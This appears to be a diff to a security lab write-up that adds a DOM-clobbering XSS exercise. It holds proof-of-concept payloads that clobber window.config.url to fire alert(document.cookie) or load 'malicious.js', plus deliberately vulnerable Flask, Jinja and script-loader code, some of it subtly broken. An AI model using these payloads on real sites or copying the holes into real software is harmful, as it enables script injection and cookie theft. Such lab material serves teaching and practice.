@@ -130,6 +130,40 @@ window.addEventListener('message', function(e)
   document.getElementById('test').innerHTML = e.data;
 })
 ```
+
+<b>Task 4</b>
+Exploit/PoC:
+
+```js
+// Check before and after using payload in DEVTOOLS:
+>>> window.config.url
+// Insert payload
+<a id=config><a id=config name=url ='' onmouseover="alert(document.cookie)">
+<a id=config><a id=config name=url href='malicious.js'>
+```
+
+Vulnerable code:
+```js
+// dom4.html
+{% autoescape false %} // no sanitizaion
+{% if user_input %}
+  <div class="alert alert-info">Последний ввод пользователя: {{ user_input }}</div> // direct output without encoding
+{% endif %}
+{% endautoescape %}
+
+// dom4.html
+var script = document.createElement('script');
+let src = window.config.url || 'script.js';
+s.src = src;
+document.body.appendChild(s);
+
+// xss.py
+def xss_dom4():
+    if request.method == 'POST':
+        data = request.form.get('user_data') // no sanitization or validation
+        return render_template("/xss_labs/dom4.html", user_input=data)
+```
+
 ## Clickjacking
 Exploit/PoC:
 
